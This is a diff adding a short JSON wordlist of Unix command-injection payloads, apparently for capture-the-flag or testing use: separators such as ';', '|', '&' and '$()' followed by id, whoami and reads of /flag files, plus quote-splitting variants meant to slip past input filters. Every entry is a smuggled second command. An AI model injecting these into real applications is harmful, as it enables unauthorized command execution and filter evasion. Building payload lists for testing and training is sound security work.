@@ -1,0 +1,16 @@
+{
+  "unix": [
+    "; id",
+    "| id",
+    "& id",
+    "; whoami",
+    "; cat /flag",
+    "; cat /flag.txt",
+    "| cat /flag*",
+    "$(cat /flag.txt)"
+  ],
+  "bypass": [
+    "i''d",
+    "c''at /flag"
+  ]
+}
